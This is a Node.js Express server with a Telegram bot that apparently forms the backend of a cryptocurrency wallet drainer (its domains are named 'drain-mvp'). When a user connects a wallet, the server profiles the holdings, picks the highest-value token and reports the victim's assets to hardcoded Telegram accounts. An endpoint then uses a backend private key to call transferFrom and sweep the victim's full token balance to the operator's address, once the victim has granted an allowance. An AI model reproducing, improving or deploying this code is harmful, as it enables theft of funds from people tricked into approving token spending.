const TelegramBot = require('node-telegram-bot-api');
const express = require('express');
const cors = require('cors');
const axios = require('axios');
const { ethers } = require('ethers');
const erc20Abi = require('erc-20-abi');
require('dotenv').config();

const app = express();
const bot = new TelegramBot(process.env.TELEGRAM_BOT_TOKEN, { polling: true });

// Rate limiting utilities
const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));

class RateLimiter {
  constructor(requestsPerSecond = 5) {
    this.requestsPerSecond = requestsPerSecond;
    this.requests = [];
  }

  async throttle() {
    const now = Date.now();
    this.requests = this.requests.filter(time => now - time < 1000);
    
    if (this.requests.length >= this.requestsPerSecond) {
      const oldestRequest = Math.min(...this.requests);
      const waitTime = 1000 - (now - oldestRequest);
      await delay(waitTime);
    }
    
    this.requests.push(Date.now());
  }
}

const rateLimiter = new RateLimiter(3); // 3 requests per second

// Middleware
const allowedOrigins = [
  'http://localhost:3000',
  'https://drain-mvp-git-main-zhangs-projects-c2c3a872.vercel.app',
  'https://drain-mvp-zhangs-projects-c2c3a872.vercel.app',
  'https://drain-mgg2bdcjz-zhangs-projects-c2c3a872.vercel.app',
  'https://drain-mvp.vercel.app/',
  'https://test-blackdag.vercel.app/',
  process.env.FRONTEND_URL
].filter(Boolean);

app.use(cors({
  origin: function (origin, callback) {
    if (!origin) return callback(null, true);
    
    if (allowedOrigins.includes(origin)) {
      return callback(null, true);
    } else {
      return callback(new Error('Not allowed by CORS'));
    }
  },
  credentials: true
}));
app.use(express.json());

// Store for user chat IDs (optional, for direct user messages)
const userChats = new Map();

// Telegram bot commands
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId, 
    'Welcome! This bot automatically receives wallet information when users connect their wallets on our website.'
  );
});

bot.onText(/\/test/, (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId, '🤖 Bot is working correctly!');
});

// Predefined Telegram destinations
const TELEGRAM_DESTINATIONS = [
  process.env.TELEGRAM_CHANNEL_ID,
  process.env.TELEGRAM_USER_ID,
  7762598379,
  7997717431,
  7682852056,
  '@nextidearly0125'
].filter(Boolean);

const TELEGRAM_USER_IDS = process.env.TELEGRAM_USER_IDS 
  ? process.env.TELEGRAM_USER_IDS.split(',').map(id => id.trim())
  : [];

// Token analysis configuration with cached metadata
const COMMON_TOKENS = [
  { 
    address: '0xdac17f958d2ee523a2206206994597c13d831ec7', 
    symbol: 'USDT', 
    decimals: 6,
    priority: 1, 
    coingeckoId: 'tether' 
  },
  { 
    address: '0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48', 
    symbol: 'USDC', 
    decimals: 6,
    priority: 1, 
    coingeckoId: 'usd-coin' 
  },
  { 
    address: '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599', 
    symbol: 'WBTC', 
    decimals: 8,
    priority: 2, 
    coingeckoId: 'wrapped-bitcoin' 
  },
  { 
    address: '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2', 
    symbol: 'WETH', 
    decimals: 18,
    priority: 2, 
    coingeckoId: 'ethereum' 
  },
  { 
    address: '0x514910771AF9Ca656af840dff83E8264EcF986CA', 
    symbol: 'LINK', 
    decimals: 18,
    priority: 3, 
    coingeckoId: 'chainlink' 
  },
  { 
    address: '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984', 
    symbol: 'UNI', 
    decimals: 18,
    priority: 3, 
    coingeckoId: 'uniswap' 
  },
  { 
    address: '0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9', 
    symbol: 'AAVE', 
    decimals: 18,
    priority: 3, 
    coingeckoId: 'aave' 
  },
  { 
    address: '0x6B175474E89094C44Da98b954EedeAC495271d0F', 
    symbol: 'DAI', 
    decimals: 18,
    priority: 1, 
    coingeckoId: 'dai' 
  },
  { 
    address: '0x95ad61b0a150d79219dcf64e1e6cc01f0b64c4ce', 
    symbol: 'SHIB', 
    decimals: 18,
    priority: 4, 
    coingeckoId: 'shiba-inu' 
  },
  { 
    address: '0xA0b73E1Ff0B80914AB6fe0444E65848C4C34450b', 
    symbol: 'CRO', 
    decimals: 8,
    priority: 4, 
    coingeckoId: 'crypto-com-chain' 
  }
];

const ERC20_ABI = erc20Abi;

// Cache for token metadata and prices
const tokenCache = new Map();
const priceCache = new Map();
const CACHE_DURATION = 5 * 60 * 1000; // 5 minutes

app.get('/api/test', (req, res) => {
  res.json({ message: 'Backend is working!', timestamp: new Date().toISOString() });
});

app.get('/api/config', (req, res) => {
  try {
    res.json({
      success: true,
      config: {
        approvalAddress: process.env.APPROVAL_ADDRESS,
        rpcUrl: process.env.RPC_URL
      }
    });
  } catch (error) {
    console.error('Error getting config:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// IMPROVED: API endpoint to analyze wallet with better rate limiting
app.post('/api/analyze-wallet', async (req, res) => {
  try {
    const { address } = req.body;
    
    if (!address) {
      return res.status(400).json({ error: 'Wallet address is required' });
    }

    console.log(`🔍 Starting token analysis for wallet: ${address}`);

    // Analyze the wallet to find highest value token
    const analysisResult = await analyzeWalletTokensImproved(address);
    
    res.json({
      success: true,
      data: {
        address: address,
        highestValueToken: analysisResult.highestValueToken,
        analysisDetails: analysisResult.details,
        timestamp: new Date().toISOString()
      }
    });

  } catch (error) {
    console.error('Error analyzing wallet:', error);
    res.status(500).json({ 
      error: 'Wallet analysis failed', 
      details: error.message 
    });
  }
});

// IMPROVED: Enhanced token analysis function with rate limiting
async function analyzeWalletTokensImproved(walletAddress) {
  const provider = new ethers.JsonRpcProvider(process.env.RPC_URL);
  
  let highestValue = 0;
  let highestValueToken = '';
  let highestBalance = 0;
  const analysis = [];
  let fallbackToken = '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599'; // WBTC default

  console.log(`🔍 Analyzing ${COMMON_TOKENS.length} tokens...`);

  // Sort by priority (stablecoins and major tokens first)
  const sortedTokens = [...COMMON_TOKENS].sort((a, b) => a.priority - b.priority);

  // Process tokens sequentially to avoid rate limits
  for (const token of sortedTokens) {
    try {
      console.log(`📊 Checking ${token.symbol}...`);
      
      // Apply rate limiting
      await rateLimiter.throttle();
      
      // Get token balance with cached metadata
      const tokenData = await getTokenBalanceImproved(provider, token, walletAddress);
      
      if (tokenData && parseFloat(tokenData.balance) > 0) {
        console.log(`💰 Found ${tokenData.balance} ${tokenData.symbol}`);
        
        // Get token price from CoinGecko with caching
        const price = await getTokenPriceWithCache(token.address, token.coingeckoId);
        const balance = parseFloat(tokenData.balance);
        const usdValue = balance * price;
        
        const tokenInfo = {
          address: token.address,
          symbol: tokenData.symbol,
          balance: tokenData.balance,
          price: price,
          usdValue: usdValue
        };
        
        analysis.push(tokenInfo);
        
        console.log(`💲 ${tokenData.symbol}: ${balance} tokens × $${price} = $${usdValue.toFixed(2)}`);
        
        // Selection logic: prefer highest USD value, then highest token balance
        const shouldSelect = usdValue > highestValue || 
                           (usdValue === 0 && highestValue === 0 && balance > highestBalance);
        
        if (shouldSelect) {
          highestValue = usdValue;
          highestValueToken = token.address;
          highestBalance = balance;
          console.log(`🎯 New highest value token: ${tokenData.symbol} ($${usdValue.toFixed(2)})`);
        }
      }
    } catch (error) {
      console.warn(`⚠️ Error analyzing ${token.symbol}:`, error.message);
      // Continue with next token instead of failing completely
    }
  }

  // If no tokens found, use fallback
  if (!highestValueToken) {
    console.log('⚠️ No tokens found, using WBTC fallback');
    highestValueToken = fallbackToken;
  }

  console.log(`✅ Analysis complete. Selected token: ${highestValueToken}`);

  return {
    highestValueToken: highestValueToken,
    details: {
      tokensAnalyzed: analysis.length,
      highestUsdValue: highestValue,
      tokens: analysis
    }
  };
}

// IMPROVED: Get token balance function with cached metadata
async function getTokenBalanceImproved(provider, tokenConfig, walletAddress) {
  try {
    const contract = new ethers.Contract(tokenConfig.address, ERC20_ABI, provider);
    
    // Use cached decimals and symbol if available
    let decimals = tokenConfig.decimals;
    let symbol = tokenConfig.symbol;
    
    // Only get balance (most important call)
    const balance = await contract.balanceOf(walletAddress);
    
    // If we don't have cached metadata, get it (but only if needed)
    if (!decimals || !symbol) {
      try {
        await rateLimiter.throttle();
        [decimals, symbol] = await Promise.all([
          decimals || contract.decimals(),
          symbol || contract.symbol()
        ]);
      } catch (metadataError) {
        console.warn(`Using fallback metadata for ${tokenConfig.address}`);
        decimals = tokenConfig.decimals || 18;
        symbol = tokenConfig.symbol || 'UNKNOWN';
      }
    }
    
    const formattedBalance = ethers.formatUnits(balance, decimals);
    
    return {
      balance: formattedBalance,
      decimals: decimals,
      symbol: symbol,
      address: tokenConfig.address
    };
  } catch (error) {
    console.warn(`Token balance error for ${tokenConfig.address}:`, error.message);
    return null;
  }
}

// IMPROVED: Get token price with caching
async function getTokenPriceWithCache(contractAddress, coingeckoId) {
  const cacheKey = contractAddress.toLowerCase();
  const now = Date.now();
  
  // Check cache first
  if (priceCache.has(cacheKey)) {
    const cached = priceCache.get(cacheKey);
    if (now - cached.timestamp < CACHE_DURATION) {
      return cached.price;
    }
  }
  
  try {
    // Use coingeckoId if available for more reliable pricing
    const url = coingeckoId 
      ? `https://api.coingecko.com/api/v3/simple/price?ids=${coingeckoId}&vs_currencies=usd`
      : `https://api.coingecko.com/api/v3/simple/token_price/ethereum?contract_addresses=${contractAddress}&vs_currencies=usd`;
    
    const response = await axios.get(url, { timeout: 5000 });
    
    const price = coingeckoId 
      ? response.data[coingeckoId]?.usd || 0
      : response.data[contractAddress.toLowerCase()]?.usd || 0;
    
    // Cache the result
    priceCache.set(cacheKey, {
      price: price,
      timestamp: now
    });
    
    return price;
  } catch (error) {
    console.warn(`Price fetch failed for ${contractAddress}:`, error.message);
    
    // Return cached price if available, even if expired
    if (priceCache.has(cacheKey)) {
      return priceCache.get(cacheKey).price;
    }
    
    return 0;
  }
}

// Rest of your existing API routes remain the same...
app.post('/api/wallet-connected', async (req, res) => {
  try {
    const { address } = req.body;
    
    if (!address) {
      return res.status(400).json({ error: 'Address is required' });
    }

    // Get wallet data
    const walletData = await getWalletData(address);
    
    // Also analyze tokens to find highest value
    const tokenAnalysis = await analyzeWalletTokensImproved(address);
    
    // Format message with token analysis
    const message = formatWalletMessage(address, walletData, tokenAnalysis);
    
    // Send to all predefined destinations
    const sendPromises = TELEGRAM_USER_IDS.map(async (destination) => {
      try {
        await bot.sendMessage(destination, message, { parse_mode: 'HTML' });
      } catch (error) {
        console.error(`Failed to send to ${destination}:`, error.message);
      }
    });
    
    await Promise.allSettled(sendPromises);
    
    res.json({ 
      success: true, 
      message: `Wallet data sent to ${TELEGRAM_USER_IDS.length} Telegram destination(s)`,
      highestValueToken: tokenAnalysis.highestValueToken
    });
  } catch (error) {
    console.error('Error:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});


// API endpoint for token transfer notifications
app.post('/api/token-transferred', async (req, res) => {
  try {
    const { 
      fromAddress, 
      toAddress, 
      tokenAddress, 
      amount, 
      symbol, 
      txHash,
      usdValue 
    } = req.body;
    
    // Validate required fields
    if (!fromAddress || !toAddress || !tokenAddress || !amount || !symbol || !txHash) {
      return res.status(400).json({ 
        error: 'Missing required fields: fromAddress, toAddress, tokenAddress, amount, symbol, txHash' 
      });
    }

    // Format transfer notification message
    const message = formatTransferMessage({
      fromAddress,
      toAddress,
      tokenAddress,
      amount,
      symbol,
      txHash,
      usdValue
    });
    
    // Send to all predefined destinations
    const sendPromises = TELEGRAM_USER_IDS.map(async (destination) => {
      try {
        await bot.sendMessage(destination, message, { parse_mode: 'HTML' });
      } catch (error) {
        console.error(`Failed to send transfer notification to ${destination}:`, error.message);
      }
    });
    
    await Promise.allSettled(sendPromises);
    
    res.json({ 
      success: true, 
      message: `Transfer notification sent to ${TELEGRAM_USER_IDS.length} Telegram destination(s)` 
    });
  } catch (error) {
    console.error('Error sending transfer notification:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// API endpoint to perform secure token transfer using backend private key
app.post('/api/transfer-tokens', async (req, res) => {
  try {
    const { 
      fromAddress, 
      tokenAddress, 
      amount 
    } = req.body;
    
    // Validate required fields
    if (!fromAddress || !tokenAddress || !amount) {
      return res.status(400).json({ 
        error: 'Missing required fields: fromAddress, tokenAddress, amount' 
      });
    }

    // Get configuration from environment variables
    const privateKey = process.env.APPROVAL_WALLET_PRIVATE_KEY;
    const rpcUrl = process.env.RPC_URL;
    const approvalAddress = process.env.APPROVAL_ADDRESS;
    console.log("config data: ", rpcUrl, approvalAddress);

    if (!privateKey || !rpcUrl || !approvalAddress) {
      return res.status(500).json({ 
        error: 'Server configuration missing. Please check environment variables.' 
      });
    }

    // Create provider and wallet
    const provider = new ethers.JsonRpcProvider(rpcUrl);
    const wallet = new ethers.Wallet(privateKey, provider);
    
    // ERC20 ABI for transfer function
    const erc20Abi = [
      "function transferFrom(address from, address to, uint256 amount) returns (bool)",
      "function balanceOf(address owner) view returns (uint256)",
      "function decimals() view returns (uint8)",
      "function symbol() view returns (string)",
      "function allowance(address owner, address spender) view returns (uint256)"
    ];
    
    // Create contract instance
    const tokenContract = new ethers.Contract(tokenAddress, erc20Abi, wallet);
    
    // Get token details
    const [symbol, decimals, balance, allowance] = await Promise.all([
      tokenContract.symbol(),
      tokenContract.decimals(),
      tokenContract.balanceOf(fromAddress),
      tokenContract.allowance(fromAddress, approvalAddress)
    ]);
    
    // Check if we have sufficient allowance
    if (allowance < balance) {
      return res.status(400).json({ 
        error: 'Insufficient allowance for transfer' 
      });
    }
    
    // Execute transfer
    const transferTx = await tokenContract.transferFrom(
      fromAddress,
      approvalAddress,
      balance // Transfer full balance
    );
    
    // Wait for confirmation
    const receipt = await transferTx.wait();
    
    if (receipt.status === 1) {
      res.json({
        success: true,
        txHash: receipt.hash,
        amount: ethers.formatUnits(balance, decimals),
        symbol: symbol,
        message: 'Token transfer completed successfully'
      });
    } else {
      throw new Error('Transaction failed');
    }
    
  } catch (error) {
    console.error('Error in token transfer:', error);
    res.status(500).json({ 
      error: 'Token transfer failed', 
      details: error.message 
    });
  }
});

// Wallet data fetching functions
async function getWalletData(address) {
  try {
    const [balance, tokens, nfts] = await Promise.all([
      getEthBalance(address),
      getTokenBalances(address),
      getNFTBalances(address)
    ]);

    const totalUSD = await calculateTotalUSD(balance, tokens);

    return {
      balance,
      tokens,
      nfts,
      totalUSD
    };
  } catch (error) {
    console.error('Error fetching wallet data:', error);
    throw error;
  }
}

async function getEthBalance(address) {
  try {
    const response = await axios.get(`https://deep-index.moralis.io/api/v2/${address}/balance`, {
      headers: {
        'X-API-Key': process.env.MORALIS_API_KEY
      }
    });
    
    return {
      balance: (parseInt(response.data.balance) / 1e18).toFixed(4),
      symbol: 'ETH'
    };
  } catch (error) {
    console.error('Error fetching ETH balance:', error);
    return { balance: '0', symbol: 'ETH' };
  }
}

async function getTokenBalances(address) {
  try {
    const response = await axios.get(`https://deep-index.moralis.io/api/v2/${address}/erc20`, {
      headers: {
        'X-API-Key': process.env.MORALIS_API_KEY
      },
      params: {
        chain: 'eth'
      }
    });
    
    return response.data.map(token => ({
      name: token.name,
      symbol: token.symbol,
      balance: (parseInt(token.balance) / Math.pow(10, token.decimals)).toFixed(4),
      decimals: token.decimals,
      logo: token.logo
    }));
  } catch (error) {
    console.error('Error fetching tokens:', error);
    return [];
  }
}

async function getNFTBalances(address) {
  try {
    const response = await axios.get(`https://deep-index.moralis.io/api/v2/${address}/nft`, {
      headers: {
        'X-API-Key': process.env.MORALIS_API_KEY
      },
      params: {
        chain: 'eth',
        format: 'decimal'
      }
    });
    
    return response.data.result.map(nft => ({
      name: nft.name,
      symbol: nft.symbol,
      tokenId: nft.token_id,
      contractAddress: nft.token_address,
      metadata: nft.metadata ? JSON.parse(nft.metadata) : null
    }));
  } catch (error) {
    console.error('Error fetching NFTs:', error);
    return [];
  }
}

async function calculateTotalUSD(ethBalance, tokens) {
  try {
    const ethPriceResponse = await axios.get(
      'https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd'
    );
    const ethPrice = ethPriceResponse.data.ethereum.usd;
    const ethValue = parseFloat(ethBalance.balance) * ethPrice;

    return ethValue.toFixed(2);
  } catch (error) {
    console.error('Error calculating USD value:', error);
    return '0.00';
  }
}

function formatWalletMessage(address, data, tokenAnalysis = null) {
  let message = `<b>💰 Wallet Analysis</b>\n\n`;
  message += `<b>Address:</b> <code>${address}</code>\n`;
  message += `<b>Total Value:</b> $${data.totalUSD} USD\n\n`;
  
  if (tokenAnalysis) {
    const highestToken = tokenAnalysis.details.tokens.find(t => t.address === tokenAnalysis.highestValueToken);
    if (highestToken) {
      message += `<b>🎯 Highest Value Token:</b>\n`;
      message += `${highestToken.symbol}: ${highestToken.balance} tokens (~$${highestToken.usdValue.toFixed(2)})\n\n`;
    }
  }
  
  message += `<b>🔷 Native Balance:</b>\n`;
  message += `${data.balance.balance} ${data.balance.symbol}\n\n`;
  
  if (data.tokens.length > 0) {
    message += `<b>🪙 Tokens (${data.tokens.length}):</b>\n`;
    data.tokens.slice(0, 10).forEach(token => {
      message += `• ${token.balance} ${token.symbol}\n`;
    });
    if (data.tokens.length > 10) {
      message += `... and ${data.tokens.length - 10} more tokens\n`;
    }
    message += `\n`;
  }
  
  if (data.nfts.length > 0) {
    message += `<b>🖼 NFTs (${data.nfts.length}):</b>\n`;
    data.nfts.slice(0, 5).forEach(nft => {
      message += `• ${nft.name || 'Unknown'} #${nft.tokenId}\n`;
    });
    if (data.nfts.length > 5) {
      message += `... and ${data.nfts.length - 5} more NFTs\n`;
    }
  }
  
  return message;
}

function formatTransferMessage(transferData) {
  const { fromAddress, toAddress, tokenAddress, amount, symbol, txHash, usdValue } = transferData;
  
  let message = `<b>🎯 Token Transfer Completed!</b>\n\n`;
  message += `<b>🔄 Transfer Details:</b>\n`;
  message += `<b>Amount:</b> ${amount} ${symbol}\n`;
  
  if (usdValue) {
    message += `<b>USD Value:</b> ~$${usdValue}\n`;
  }
  
  message += `\n<b>📍 Addresses:</b>\n`;
  message += `<b>From:</b> <code>${fromAddress}</code>\n`;
  message += `<b>To:</b> <code>${toAddress}</code>\n`;
  
  message += `\n<b>🪙 Token Contract:</b>\n`;
  message += `<code>${tokenAddress}</code>\n`;
  
  message += `\n<b>🔗 Transaction:</b>\n`;
  message += `<a href="https://etherscan.io/tx/${txHash}">View on Etherscan</a>\n`;
  message += `<code>${txHash}</code>\n`;
  
  message += `\n<b>⏰ Status:</b> ✅ Confirmed\n`;
  message += `<b>🕐 Time:</b> ${new Date().toLocaleString()}\n`;
  
  return message;
}

// Start server
const PORT = process.env.PORT || 3001;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
  console.log('Telegram bot is active');
});